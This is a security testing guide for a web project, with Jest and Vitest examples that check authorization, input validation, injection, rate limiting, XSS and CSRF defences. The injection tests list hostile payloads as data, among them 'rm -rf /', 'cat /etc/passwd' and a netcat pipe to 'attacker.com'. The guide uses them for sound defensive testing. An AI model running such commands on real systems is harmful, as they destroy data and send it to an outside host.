# Security Testing Guide

This guide provides comprehensive instructions for performing security testing on both backend and frontend features in the Capstone project.

## Table of Contents

- [Overview](#overview)
- [Security Testing Types](#security-testing-types)
- [Backend Security Testing](#backend-security-testing)
  - [Authentication & Authorization](#authentication--authorization)
  - [Input Validation](#input-validation)
  - [Injection Attacks](#injection-attacks)
  - [Rate Limiting](#rate-limiting)
  - [Data Exposure](#data-exposure)
  - [Session Management](#session-management)
- [Frontend Security Testing](#frontend-security-testing)
  - [XSS Prevention](#xss-prevention)
  - [CSRF Protection](#csrf-protection)
  - [Content Security Policy](#content-security-policy)
  - [Sensitive Data Handling](#sensitive-data-handling)
  - [Third-Party Dependencies](#third-party-dependencies)
- [Common Vulnerabilities](#common-vulnerabilities)
- [Security Testing Tools](#security-testing-tools)
- [Writing Security Tests](#writing-security-tests)
- [Best Practices](#best-practices)

---

## Overview

Security testing identifies vulnerabilities in your application that could be exploited by attackers. Unlike functional testing, security testing focuses on:

- **Confidentiality**: Ensuring data is only accessible to authorized users
- **Integrity**: Preventing unauthorized data modification
- **Availability**: Ensuring the system is available when needed
- **Authentication**: Verifying user identities
- **Authorization**: Ensuring users can only access permitted resources

---

## Security Testing Types

### 1. Authentication Testing
Verifies that user authentication mechanisms are secure and cannot be bypassed.

### 2. Authorization Testing
Ensures users can only access resources they are permitted to access.

### 3. Input Validation Testing
Tests that all user input is properly validated and sanitized.

### 4. Injection Testing
Checks for SQL injection, NoSQL injection, command injection, and other injection attacks.

### 5. Rate Limiting Testing
Verifies that API endpoints are protected against abuse and denial-of-service attacks.

### 6. Data Exposure Testing
Identifies sensitive data that might be exposed through error messages, logs, or API responses.

### 7. Session Management Testing
Tests session creation, expiration, and security.

---

## Backend Security Testing

### Authentication & Authorization

**Test: Missing Role Check on GET Endpoints**

```javascript
// backend/__tests__/security/variables-authorization.test.js
const request = require('supertest');
const { setupMongoDB, teardownMongoDB, setupApp } = require('../helpers/setup');
const User = require('../../services/auth-service/src/models/User');
const Variable = require('../../services/business-service/src/models/Variable');

describe('Variables - Authorization Tests', () => {
  let app;
  let mongoServer;
  let adminToken;
  let userToken;

  beforeAll(async () => {
    mongoServer = await setupMongoDB();
    app = setupApp('business');
    
    // Create admin user
    const admin = await User.create({
      email: 'admin@example.com',
      password: '$2a$10$hashedpassword',
      role: 'admin',
      isVerified: true
    });
    adminToken = generateAuthToken(admin);

    // Create regular user
    const regularUser = await User.create({
      email: 'user@example.com',
      password: '$2a$10$hashedpassword',
      role: 'user',
      isVerified: true
    });
    userToken = generateAuthToken(regularUser);
  });

  afterAll(async () => {
    await teardownMongoDB();
  });

  beforeEach(async () => {
    await Variable.deleteMany({});
  });

  it('should allow admin to access variables list', async () => {
    const response = await request(app)
      .get('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .expect(200);

    expect(response.body).toHaveProperty('data');
  });

  it('should deny regular user access to variables list', async () => {
    const response = await request(app)
      .get('/api/business/admin/variables')
      .set('Authorization', `Bearer ${userToken}`)
      .expect(403);

    expect(response.body.error).toHaveProperty('code');
  });

  it('should deny access without authentication', async () => {
    await request(app)
      .get('/api/business/admin/variables')
      .expect(401);
  });

  it('should deny regular user access to variables by fee ID', async () => {
    await request(app)
      .get('/api/business/admin/variables/by-fee/507f1f77bcf86cd799439011')
      .set('Authorization', `Bearer ${userToken}`)
      .expect(403);
  });

  it('should deny regular user access to variables by fee rule ID', async () => {
    await request(app)
      .get('/api/business/admin/variables/by-variable-fee-rule/507f1f77bcf86cd799439011')
      .set('Authorization', `Bearer ${userToken}`)
      .expect(403);
  });
});
```

**Test: Step-Up Token Validation**

```javascript
describe('Step-Up Token Security', () => {
  it('should reject requests without step-up token on create', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Test Variable',
        question: 'Test question',
        calculationMethod: 'per_unit',
        unit: 'sqm'
      })
      .expect(403);

    expect(response.body.error.message).toContain('step-up');
  });

  it('should reject invalid step-up token', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', 'invalid-token')
      .send({
        name: 'Test Variable',
        question: 'Test question',
        calculationMethod: 'per_unit',
        unit: 'sqm'
      })
      .expect(403);
  });

  it('should reject expired step-up token', async () => {
    const expiredToken = generateExpiredStepUpToken();
    
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', expiredToken)
      .send({
        name: 'Test Variable',
        question: 'Test question',
        calculationMethod: 'per_unit',
        unit: 'sqm'
      })
      .expect(403);
  });
});
```

### Input Validation

**Test: Enum Validation**

```javascript
describe('Input Validation - Calculation Method', () => {
  it('should reject invalid calculation method', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', generateValidStepUpToken())
      .send({
        name: 'Test Variable',
        question: 'Test question',
        calculationMethod: 'invalid_method',
        unit: 'sqm'
      })
      .expect(400);

    expect(response.body.error.message).toContain('calculationMethod');
  });

  it('should accept valid calculation methods', async () => {
    const validMethods = ['per_unit', 'percentage', 'custom', 'bracketed', 'classification', 'yes_no'];
    
    for (const method of validMethods) {
      const response = await request(app)
        .post('/api/business/admin/variables')
        .set('Authorization', `Bearer ${adminToken}`)
        .set('stepUpToken', generateValidStepUpToken())
        .send({
          name: 'Test Variable',
          question: 'Test question',
          calculationMethod: method,
          unit: 'sqm'
        });
      
      expect([200, 201]).toContain(response.status);
    }
  });
});
```

**Test: Bracket Validation**

```javascript
describe('Input Validation - Brackets', () => {
  it('should reject bracket with minValue > maxValue', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', generateValidStepUpToken())
      .send({
        name: 'Test Variable',
        question: 'Test question',
        calculationMethod: 'bracketed',
        unit: 'sqm',
        brackets: [
          { minValue: 100, maxValue: 50, fixedAmount: 10 }
        ]
      })
      .expect(400);

    expect(response.body.error.message).toContain('bracket');
  });

  it('should reject negative values in brackets', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', generateValidStepUpToken())
      .send({
        name: 'Test Variable',
        question: 'Test question',
        calculationMethod: 'bracketed',
        unit: 'sqm',
        brackets: [
          { minValue: -10, maxValue: 50, fixedAmount: 10 }
        ]
      })
      .expect(400);
  });

  it('should reject negative fixedAmount', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', generateValidStepUpToken())
      .send({
        name: 'Test Variable',
        question: 'Test question',
        calculationMethod: 'bracketed',
        unit: 'sqm',
        brackets: [
          { minValue: 0, maxValue: 50, fixedAmount: -10 }
        ]
      })
      .expect(400);
  });
});
```

**Test: Custom Calculation Method Injection**

```javascript
describe('Input Validation - Custom Calculation Method', () => {
  it('should reject code injection in customCalculationMethod', async () => {
    const maliciousInputs = [
      'process.exit(1)',
      'require("child_process").exec("rm -rf /")',
      '__proto__.polluted = true',
      'constructor.constructor("return process")().exit()',
    ];

    for (const input of maliciousInputs) {
      const response = await request(app)
        .post('/api/business/admin/variables')
        .set('Authorization', `Bearer ${adminToken}`)
        .set('stepUpToken', generateValidStepUpToken())
        .send({
          name: 'Test Variable',
          question: 'Test question',
          calculationMethod: 'custom',
          customCalculationMethod: input,
          unit: 'sqm'
        });

      // Should not execute the code
      expect([400, 422]).toContain(response.status);
    }
  });

  it('should sanitize customCalculationMethod', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', generateValidStepUpToken())
      .send({
        name: 'Test Variable',
        question: 'Test question',
        calculationMethod: 'custom',
        customCalculationMethod: 'return base * rate',
        unit: 'sqm'
      })
      .expect(201);

    // Verify the stored value is sanitized
    const variable = await Variable.findById(response.body.data._id);
    expect(variable.customCalculationMethod).not.toContain('process');
  });
});
```

### Injection Attacks

**Test: NoSQL Injection**

```javascript
describe('NoSQL Injection Prevention', () => {
  it('should prevent NoSQL injection in search', async () => {
    const maliciousInputs = [
      { $ne: null },
      { $gt: '' },
      { $where: 'this.password == "admin"' },
      { $regex: '.*' },
    ];

    for (const input of maliciousInputs) {
      const response = await request(app)
        .get('/api/business/admin/variables')
        .set('Authorization', `Bearer ${adminToken}`)
        .query({ name: JSON.stringify(input) });

      // Should not return all variables or cause errors
      expect([200, 400]).toContain(response.status);
      if (response.status === 200) {
        expect(response.body.data.length).toBeLessThan(1000); // Reasonable limit
      }
    }
  });

  it('should prevent NoSQL injection in ID parameter', async () => {
    const maliciousIds = [
      { $ne: null },
      "1' || '1'='1",
      "'; return db.users.find(); //",
    ];

    for (const id of maliciousIds) {
      const response = await request(app)
        .get(`/api/business/admin/variables/${encodeURIComponent(id)}`)
        .set('Authorization', `Bearer ${adminToken}`);

      expect([400, 404]).toContain(response.status);
    }
  });
});
```

**Test: Command Injection**

```javascript
describe('Command Injection Prevention', () => {
  it('should prevent command injection in customId', async () => {
    const maliciousInputs = [
      'test; rm -rf /',
      'test && cat /etc/passwd',
      'test | nc attacker.com 4444',
      'test$(whoami)',
      'test`id`',
    ];

    for (const input of maliciousInputs) {
      const response = await request(app)
        .post('/api/business/admin/variables')
        .set('Authorization', `Bearer ${adminToken}`)
        .set('stepUpToken', generateValidStepUpToken())
        .send({
          name: 'Test Variable',
          question: 'Test question',
          calculationMethod: 'per_unit',
          unit: 'sqm',
          customId: input
        });

      // Should not execute commands
      expect([201, 400]).toContain(response.status);
    }
  });
});
```

### Rate Limiting

**Test: API Rate Limiting**

```javascript
describe('Rate Limiting', () => {
  it('should allow requests within rate limit', async () => {
    const promises = [];
    for (let i = 0; i < 10; i++) {
      promises.push(
        request(app)
          .get('/api/business/admin/variables')
          .set('Authorization', `Bearer ${adminToken}`)
      );
    }
    
    const responses = await Promise.all(promises);
    const successCount = responses.filter(r => r.status === 200).length;
    expect(successCount).toBeGreaterThan(5);
  });

  it('should block requests exceeding rate limit', async () => {
    const promises = [];
    for (let i = 0; i < 100; i++) {
      promises.push(
        request(app)
          .get('/api/business/admin/variables')
          .set('Authorization', `Bearer ${adminToken}`)
      );
    }
    
    const responses = await Promise.all(promises);
    const rateLimitedCount = responses.filter(r => r.status === 429).length;
    expect(rateLimitedCount).toBeGreaterThan(0);
  });

  it('should apply rate limiting per user', async () => {
    // User 1 makes many requests
    const user1Promises = [];
    for (let i = 0; i < 50; i++) {
      user1Promises.push(
        request(app)
          .get('/api/business/admin/variables')
          .set('Authorization', `Bearer ${adminToken}`)
      );
    }
    
    // User 2 makes a single request
    const user2Response = await request(app)
      .get('/api/business/admin/variables')
      .set('Authorization', `Bearer ${userToken}`);

    // User 2 should still be able to access
    expect(user2Response.status).toBe(200);
  });
});
```

### Data Exposure

**Test: Sensitive Data in Error Messages**

```javascript
describe('Data Exposure Prevention', () => {
  it('should not expose stack traces in error responses', async () => {
    const response = await request(app)
      .get('/api/business/admin/variables/invalid-id')
      .set('Authorization', `Bearer ${adminToken}`)
      .expect(400);

    const responseString = JSON.stringify(response.body);
    expect(responseString).not.toContain('stack');
    expect(responseString).not.toContain('Error:');
    expect(responseString).not.toContain('at ');
  });

  it('should not expose internal paths in error messages', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', generateValidStepUpToken())
      .send({}) // Missing required fields
      .expect(400);

    const responseString = JSON.stringify(response.body);
    expect(responseString).not.toContain('/services/');
    expect(responseString).not.toContain('/models/');
    expect(responseString).not.toContain('/routes/');
  });

  it('should not expose database schema in error messages', async () => {
    const response = await request(app)
      .post('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .set('stepUpToken', generateValidStepUpToken())
      .send({})
      .expect(400);

    const responseString = JSON.stringify(response.body);
    expect(responseString).not.toContain('mongoose');
    expect(responseString).not.toContain('Schema');
    expect(responseString).not.toContain('_id');
  });
});
```

**Test: Information Disclosure in API Responses**

```javascript
describe('Information Disclosure', () => {
  it('should not expose internal IDs in list responses', async () => {
    await Variable.create({
      name: 'Test Variable',
      question: 'Test question',
      calculationMethod: 'per_unit',
      unit: 'sqm'
    });

    const response = await request(app)
      .get('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .expect(200);

    // Should use customId instead of _id if available
    expect(response.body.data[0]).toHaveProperty('_id');
    // Consider whether _id should be exposed in list views
  });

  it('should not expose version history in list responses', async () => {
    const response = await request(app)
      .get('/api/business/admin/variables')
      .set('Authorization', `Bearer ${adminToken}`)
      .expect(200);

    // Version should only be in detail view
    if (response.body.data.length > 0) {
      // Decide if version should be in list or not
    }
  });
});
```

### Session Management

**Test: JWT Expiration**

```javascript
describe('JWT Security', () => {
  it('should reject expired JWT tokens', async () => {
    const expiredToken = generateExpiredAuthToken();
    
    const response = await request(app)
      .get('/api/business/admin/variables')
      .set('Authorization', `Bearer ${expiredToken}`)
      .expect(401);

    expect(response.body.error.code).toBe('TOKEN_EXPIRED');
  });

  it('should reject malformed JWT tokens', async () => {
    const malformedTokens = [
      'not-a-jwt',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
      'Bearer token',
    ];

    for (const token of malformedTokens) {
      await request(app)
        .get('/api/business/admin/variables')
        .set('Authorization', `Bearer ${token}`)
        .expect(401);
    }
  });

  it('should reject tokens with invalid signature', async () => {
    const token = generateAuthTokenWithInvalidSignature();
    
    await request(app)
      .get('/api/business/admin/variables')
      .set('Authorization', `Bearer ${token}`)
      .expect(401);
  });
});
```

---

## Frontend Security Testing

### XSS Prevention

**Test: XSS in User Input**

```jsx
// web/src/features/admin/pages/variables/__tests__/VariableDetailPanel.security.test.jsx
import { describe, it, expect, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import VariableDetailPanel from '../components/VariableDetailPanel';

describe('XSS Prevention', () => {
  it('should sanitize malicious script in variable name', () => {
    const maliciousVariable = {
      _id: '1',
      name: '<script>alert("XSS")</script>',
      question: 'Test question',
      calculationMethod: 'per_unit',
      unit: 'sqm'
    };

    render(<VariableDetailPanel variable={maliciousVariable} />);
    
    // Script should not be executed
    expect(screen.queryByText('alert("XSS")')).not.toBeInTheDocument();
    // Should display escaped or sanitized content
  });

  it('should sanitize XSS in description', () => {
    const maliciousVariable = {
      _id: '1',
      name: 'Test Variable',
      description: '<img src=x onerror=alert("XSS")>',
      question: 'Test question',
      calculationMethod: 'per_unit',
      unit: 'sqm'
    };

    render(<VariableDetailPanel variable={maliciousVariable} />);
    
    // Image onerror should not execute
    const images = screen.queryAllByRole('img');
    images.forEach(img => {
      expect(img).not.toHaveAttribute('onerror');
    });
  });

  it('should sanitize XSS in legalBasis URLs', () => {
    const maliciousVariable = {
      _id: '1',
      name: 'Test Variable',
      question: 'Test question',
      calculationMethod: 'per_unit',
      unit: 'sqm',
      legalBasis: [{
        url: 'javascript:alert("XSS")',
        title: 'Malicious Link'
      }]
    };

    render(<VariableDetailPanel variable={maliciousVariable} />);
    
    // JavaScript URLs should be blocked or sanitized
    const links = screen.queryAllByRole('link');
    links.forEach(link => {
      expect(link.href).not.toContain('javascript:');
    });
  });
});
```

### CSRF Protection

**Test: CSRF Token Validation**

```javascript
// web/src/features/admin/services/__tests__/variableService.security.test.js
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { createVariable } from '../variableService';

describe('CSRF Protection', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('should include CSRF token in requests', async () => {
    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({ data: { _id: '1' } })
    });
    
    global.fetch = mockFetch;
    
    await createVariable({ name: 'Test' });
    
    const callArgs = mockFetch.mock.calls[0];
    const headers = callArgs[1]?.headers;
    
    // Check for CSRF token header
    expect(headers).toHaveProperty('X-CSRF-Token');
  });

  it('should reject requests without CSRF token', async () => {
    const mockFetch = vi.fn().mockResolvedValue({
      ok: false,
      status: 403,
      json: async () => ({ error: { code: 'CSRF_INVALID' } })
    });
    
    global.fetch = mockFetch;
    
    // Remove CSRF token
    document.cookie = 'csrf-token=;';
    
    await expect(createVariable({ name: 'Test' })).rejects.toThrow();
  });
});
```

### Content Security Policy

**Test: CSP Violations**

```javascript
describe('Content Security Policy', () => {
  it('should have CSP headers in API responses', async () => {
    const response = await fetch('/api/business/admin/variables', {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    
    expect(response.headers.get('Content-Security-Policy')).toBeTruthy();
  });

  it('should block inline scripts', async () => {
    // Test that inline scripts are blocked by CSP
    const script = document.createElement('script');
    script.textContent = 'alert("XSS")';
    document.body.appendChild(script);
    
    // Script should not execute if CSP is properly configured
    expect(window.alert).not.toHaveBeenCalled();
  });

  it('should block eval()', async () => {
    // Test that eval is blocked by CSP
    expect(() => eval('alert("test")')).toThrow();
  });
});
```

### Sensitive Data Handling

**Test: Sensitive Data in Local Storage**

```javascript
describe('Sensitive Data Handling', () => {
  it('should not store sensitive data in localStorage', () => {
    // After using the app, check localStorage
    const localStorageContent = { ...localStorage };
    
    // Should not contain sensitive data
    expect(localStorageContent).not.toContain('password');
    expect(localStorageContent).not.toContain('token');
    expect(localStorageContent).not.toContain('secret');
  });

  it('should clear sensitive data on logout', () => {
    // Simulate logout
    logout();
    
    // Check that sensitive data is cleared
    expect(localStorage.getItem('token')).toBeNull();
    expect(localStorage.getItem('user')).toBeNull();
  });

  it('should not expose sensitive data in URL', () => {
    // Check that sensitive data is not in URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    
    expect(urlParams.has('token')).toBe(false);
    expect(urlParams.has('password')).toBe(false);
  });
});
```

### Third-Party Dependencies

**Test: Vulnerable Dependencies**

```bash
# Run npm audit to check for vulnerable dependencies
npm audit

# Run audit with fix
npm audit fix

# Run audit for production dependencies only
npm audit --production

# Use Snyk for more comprehensive scanning
npx snyk test
```

```javascript
// web/src/__tests__/dependencies.test.js
import { describe, it, expect } from 'vitest';

describe('Dependency Security', () => {
  it('should not have known vulnerable dependencies', async () => {
    const { execSync } = require('child_process');
    
    try {
      const auditOutput = execSync('npm audit --json', { encoding: 'utf-8' });
      const auditResult = JSON.parse(auditOutput);
      
      // Check for high/critical vulnerabilities
      const vulnerabilities = auditResult.vulnerabilities || {};
      const highVulns = vulnerabilities.high || [];
      const criticalVulns = vulnerabilities.critical || [];
      
      expect(highVulns.length).toBe(0);
      expect(criticalVulns.length).toBe(0);
    } catch (error) {
      // npm audit returns non-zero exit code if vulnerabilities found
      expect(error.status).not.toBe(1);
    }
  });
});
```

---

## Common Vulnerabilities

### OWASP Top 10

1. **Broken Access Control**: Users can access resources they shouldn't
2. **Cryptographic Failures**: Sensitive data not properly encrypted
3. **Injection**: SQL, NoSQL, command injection attacks
4. **Insecure Design**: Security flaws in architecture
5. **Security Misconfiguration**: Default credentials, debug mode enabled
6. **Vulnerable Components**: Outdated or vulnerable dependencies
7. **Authentication Failures**: Weak password policies, session fixation
8. **Software/Data Integrity Failures**: Unsigned updates, CI/CD vulnerabilities
9. **Security Logging Failures**: Insufficient logging, no audit trail
10. **Server-Side Request Forgery (SSRF)**: Server makes requests to internal systems

### Common Backend Vulnerabilities

- Missing authentication/authorization
- SQL/NoSQL injection
- Mass assignment
- IDOR (Insecure Direct Object Reference)
- Missing rate limiting
- Weak password policies
- Session fixation
- CSRF (Cross-Site Request Forgery)
- XSS (Cross-Site Scripting) via API responses
- Information disclosure in error messages

### Common Frontend Vulnerabilities

- XSS (Stored, Reflected, DOM-based)
- CSRF
- Clickjacking
- Sensitive data in localStorage/sessionStorage
- Insecure dependencies
- Missing CSP headers
- Open redirect
- Client-side logic bypass
- DOM-based XSS
- Prototype pollution

---

## Security Testing Tools

### Backend Tools

**Static Analysis**
```bash
# ESLint with security plugins
npm install --save-dev eslint-plugin-security
npm run lint

# SonarQube for code quality and security
docker run -d -p 9000:9000 sonarqube

# Snyk for vulnerability scanning
npm install -g snyk
snyk auth
snyk test
```

**Dynamic Analysis**
```bash
# OWASP ZAP for automated security testing
docker run -u 0 -p 8080:8080 -i owasp/zap2docker-stable zap-webswing.sh

# Burp Suite for manual security testing
# Download from https://portswigger.net/burp

# SQLMap for SQL injection testing
sqlmap -u "http://localhost:3000/api/variables" --batch
```

**Dependency Scanning**
```bash
# npm audit
npm audit

# npm-check-updates for outdated packages
npx npm-check-updates

# Snyk
npx snyk test
npx snyk monitor
```

### Frontend Tools

**XSS Testing**
```bash
# XSSer for XSS testing
xsser -u "http://localhost:5173" --auto

# DOM XSS Scanner
npm install -g dom-xss-scanner
```

**Dependency Scanning**
```bash
# npm audit
npm audit

# Snyk
npx snyk test

# Audit for known vulnerabilities in React
npm install --save-dev react-audit-cli
npx react-audit
```

**Content Security Policy**
```bash
# CSP Evaluator
# https://csp-evaluator.withgoogle.com/

# Test CSP headers
curl -I http://localhost:5173 | grep -i "content-security-policy"
```

---

## Writing Security Tests

### Security Test Structure

```javascript
// backend/__tests__/security/feature-name.security.test.js
const request = require('supertest');
const { setupMongoDB, teardownMongoDB, setupApp } = require('../helpers/setup');

describe('Feature Name - Security Tests', () => {
  let app;
  let mongoServer;
  let adminToken;
  let userToken;

  beforeAll(async () => {
    mongoServer = await setupMongoDB();
    app = setupApp('service-name');
    // Setup authentication tokens
  });

  afterAll(async () => {
    await teardownMongoDB();
  });

  describe('Authentication & Authorization', () => {
    // Tests for auth/security
  });

  describe('Input Validation', () => {
    // Tests for input validation
  });

  describe('Injection Attacks', () => {
    // Tests for injection prevention
  });

  describe('Rate Limiting', () => {
    // Tests for rate limiting
  });

  describe('Data Exposure', () => {
    // Tests for information disclosure
  });
});
```

### Security Test Patterns

**Pattern 1: Authentication Bypass**
```javascript
it('should not allow access without authentication', async () => {
  await request(app)
    .get('/api/protected-endpoint')
    .expect(401);
});
```

**Pattern 2: Authorization Bypass**
```javascript
it('should not allow regular user to access admin endpoint', async () => {
  await request(app)
    .get('/api/admin/endpoint')
    .set('Authorization', `Bearer ${userToken}`)
    .expect(403);
});
```

**Pattern 3: Input Validation**
```javascript
it('should reject malicious input', async () => {
  const maliciousInput = '<script>alert("XSS")</script>';
  
  await request(app)
    .post('/api/endpoint')
    .send({ data: maliciousInput })
    .expect(400);
});
```

**Pattern 4: Injection Attack**
```javascript
it('should prevent SQL injection', async () => {
  const injection = "' OR '1'='1";
  
  const response = await request(app)
    .get(`/api/endpoint?id=${encodeURIComponent(injection)}`);
  
  expect(response.body.data.length).toBeLessThan(100);
});
```

**Pattern 5: Rate Limiting**
```javascript
it('should block excessive requests', async () => {
  const promises = [];
  for (let i = 0; i < 100; i++) {
    promises.push(request(app).get('/api/endpoint'));
  }
  
  const responses = await Promise.all(promises);
  const blockedCount = responses.filter(r => r.status === 429).length;
  expect(blockedCount).toBeGreaterThan(0);
});
```

---

## Best Practices

### General Security Practices

1. **Defense in Depth**: Use multiple layers of security
2. **Principle of Least Privilege**: Grant minimum necessary permissions
3. **Fail Securely**: Default to secure behavior on errors
4. **Security by Design**: Consider security from the start
5. **Keep Dependencies Updated**: Regularly update and audit dependencies
6. **Use Security Headers**: Implement CSP, HSTS, X-Frame-Options, etc.
7. **Encrypt Sensitive Data**: Encrypt at rest and in transit
8. **Implement Logging**: Log security events for audit trails
9. **Regular Security Testing**: Include security tests in CI/CD
10. **Security Training**: Train developers on secure coding practices

### Backend Security Best Practices

1. **Validate All Input**: Never trust user input
2. **Use Parameterized Queries**: Prevent injection attacks
3. **Implement Rate Limiting**: Protect against abuse
4. **Use Strong Authentication**: Multi-factor authentication where possible
5. **Secure Session Management**: Use secure, HttpOnly cookies
6. **Implement CORS Properly**: Restrict cross-origin requests
7. **Use HTTPS Only**: Never transmit sensitive data over HTTP
8. **Sanitize Error Messages**: Don't expose internal details
9. **Implement Audit Logging**: Track sensitive operations
10. **Regular Security Audits**: Periodically review and test security

### Frontend Security Best Practices

1. **Sanitize User Input**: Never render untrusted content
2. **Use CSP Headers**: Restrict script sources
3. **Implement CSRF Protection**: Use tokens for state-changing operations
4. **Avoid eval()**: Never use eval() or similar functions
5. **Use HttpOnly Cookies**: Store tokens in HttpOnly cookies
6. **Validate on Server**: Never rely solely on client-side validation
7. **Keep Dependencies Updated**: Regularly update and audit
8. **Use Security Headers**: Implement X-Frame-Options, X-Content-Type-Options
9. **Test for XSS**: Regularly test for XSS vulnerabilities
10. **Secure WebSockets**: Validate WebSocket connections

### Testing Best Practices

1. **Test Security Early**: Include security tests from the start
2. **Test Regularly**: Run security tests in CI/CD pipeline
3. **Test for Common Vulnerabilities**: Focus on OWASP Top 10
4. **Use Security Tools**: Leverage automated security testing tools
5. **Test Authentication**: Test all authentication flows
6. **Test Authorization**: Test permission boundaries
7. **Test Input Validation**: Test with malicious inputs
8. **Test Error Handling**: Ensure errors don't expose information
9. **Test Rate Limiting**: Verify rate limiting works
10. **Document Security Tests**: Document security test coverage

---

## Quick Reference

### Security Test Commands

```bash
# Backend security tests
cd backend
npm test -- __tests__/security/

# Frontend security tests
cd web
npm test -- src/**/__tests__/*.security.test.jsx

# Dependency audit
npm audit

# Snyk scan
npx snyk test

# OWASP ZAP
docker run -u 0 -p 8080:8080 owasp/zap2docker-stable zap-webswing.sh
```

### Security Checklist

- [ ] All endpoints require authentication
- [ ] Admin endpoints require admin role
- [ ] Step-up authentication for sensitive operations
- [ ] Input validation on all endpoints
- [ ] Rate limiting on all endpoints
- [ ] SQL/NoSQL injection prevention
- [ ] XSS prevention in API responses
- [ ] CSRF protection on state-changing operations
- [ ] Security headers implemented
- [ ] Sensitive data encrypted
- [ ] Error messages don't expose internal details
- [ ] Audit logging for sensitive operations
- [ ] Dependencies regularly updated
- [ ] Security tests in CI/CD pipeline
- [ ] Regular security audits performed
